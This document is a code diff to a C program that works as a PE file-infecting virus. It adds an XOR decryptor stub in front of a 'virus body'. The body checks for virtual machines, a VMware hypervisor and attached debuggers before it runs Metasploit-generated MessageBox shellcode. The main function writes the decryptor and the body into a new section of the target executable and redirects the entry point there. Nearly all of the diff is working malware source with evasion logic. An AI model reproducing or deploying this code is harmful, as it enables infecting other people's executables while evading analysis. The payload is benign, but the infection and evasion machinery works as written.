@@ -1,8 +1,18 @@
 #include "mapfile.h"
 #include "pefile.h"
 
-void StartMessageBoxShellcode()
+VOID SHELLCODE()
 {
+    __asm__(
+        "_Decryptor:"
+        "lea _VirusBody, %esi;"
+        "mov $100, %eax;"
+        "Decryploop:"
+        "xor $0x6, (%esi);"
+        "add $4, %esi;"
+        "sub $4, %eax;"
+        "jnz Decryploop;");
+
     // Check VM: Calling CPUID with eax = 1 and check 31st bit of ecx, vm is 1
     __asm__(
         "_VirusBody:"
@@ -10,7 +20,7 @@ void StartMessageBoxShellcode()
         "inc %eax;"
         "cpuid;"
         "bt $0x1f, %ecx;"
-        "jc RETURNEP;");
+        "jc _ReturnEntryPoint;");
 
     // Check Hypervisor Brand: Calling CPUID with eax = 0x40000000 and check ecx, edx
     __asm__(
@@ -20,7 +30,7 @@ void StartMessageBoxShellcode()
         "cmp $0x4D566572, %ecx;"
         "jne CheckDebug;"
         "cmp $0x65726177, %edx;"
-        "je RETURNEP;");
+        "je _ReturnEntryPoint;");
 
     // Check debug: PEB.BeingDebugged
     __asm__(
@@ -30,7 +40,7 @@ void StartMessageBoxShellcode()
         "xor %eax, %eax;"
         "movb 2(%ebx), %al;"
         "cmp $1, %eax;"
-        "je RETURNEP;");
+        "je _ReturnEntryPoint;");
 
     // Shellcode messagebox generate by Metasploit
     __asm__(
@@ -57,20 +67,7 @@ void StartMessageBoxShellcode()
         ".byte 0x37;.byte 0x35;.byte 0x32;.byte 0x68;.byte 0x20;.byte 0x62;.byte 0x79;.byte 0x20;.byte 0x68;.byte 0x63;.byte 0x74;.byte 0x65;.byte 0x64;"
         ".byte 0x68;.byte 0x49;.byte 0x6e;.byte 0x66;.byte 0x65;.byte 0x31;.byte 0xc9;.byte 0x88;.byte 0x4c;.byte 0x24;.byte 0x1d;.byte 0x89;.byte 0xe1;"
         ".byte 0x31;.byte 0xd2;.byte 0x52;.byte 0x53;.byte 0x51;.byte 0x52;.byte 0xff;.byte 0xd0;"
-        "RETURNEP:");
-}
-
-void EndMessageBoxShellcode()
-{
-}
-
-void StartDecryptor()
-{
-    __asm__("nop");
-}
-
-void EndDecryptor()
-{
+        "_ReturnEntryPoint:");
 }
 
 int main(int argc, char *argv[])
@@ -124,16 +121,26 @@ int main(int argc, char *argv[])
     DWORD dwNewSectionRawOffset = AddEmptySection(&pe, wNumnberOfSections, dwSectionAlignment, pMapView);
 
     // Add Shellcode to new section
-    DWORD dwDecryptorShellcodeSize = (DWORD)EndDecryptor - (DWORD)StartDecryptor - 6;
-    DWORD dwMsgboxShellcodeSize = (DWORD)EndMessageBoxShellcode - (DWORD)StartMessageBoxShellcode - 6;
-    DWORD dwShellcodeSize = dwDecryptorShellcodeSize + dwMsgboxShellcodeSize;
+    extern const char Decryptor[];
+    extern const char VirusBody[];
+    extern const char ReturnEntryPoint[];
 
-    PBYTE pFinalShellcode = (PBYTE)malloc(dwShellcodeSize * sizeof(BYTE));
-    memcpy(pFinalShellcode, (PBYTE)StartDecryptor + 3, dwDecryptorShellcodeSize);
-    memcpy(pFinalShellcode + dwDecryptorShellcodeSize, (PBYTE)StartMessageBoxShellcode + 3, dwMsgboxShellcodeSize);
+    // Get size of shellcode
+    DWORD dwDecryptorShellcodeSize = (DWORD)VirusBody - (DWORD)Decryptor;
+    DWORD dwMessageboxShellcodeSize = (DWORD)ReturnEntryPoint - (DWORD)VirusBody;
+    DWORD dwShellcodeSize = dwDecryptorShellcodeSize + dwMessageboxShellcodeSize;
+
+    // Get decryptor shellcode
+    PBYTE pDecryptorShellcode = (PBYTE)malloc(dwDecryptorShellcodeSize * sizeof(BYTE));
+    memcpy(pDecryptorShellcode, (PBYTE)Decryptor, dwDecryptorShellcodeSize);
+
+    // Get Messagebox shellcode
+    PBYTE pMessageboxShellcode = (PBYTE)malloc(dwMessageboxShellcodeSize * sizeof(BYTE));
+    memcpy(pMessageboxShellcode, (PBYTE)VirusBody, dwMessageboxShellcodeSize);
 
     // Add shellcode to new section
-    memcpy(pMapView + dwNewSectionRawOffset, pFinalShellcode, dwShellcodeSize);
+    memcpy(pMapView + dwNewSectionRawOffset, pDecryptorShellcode, dwDecryptorShellcodeSize);
+    memcpy(pMapView + dwNewSectionRawOffset + dwDecryptorShellcodeSize, pMessageboxShellcode, dwMessageboxShellcodeSize);
 
     // Set new address of entryPoint
     PIMAGE_SECTION_HEADER pNewSectionHeader = &pe.pFirstSectionHeader[wNumnberOfSections];
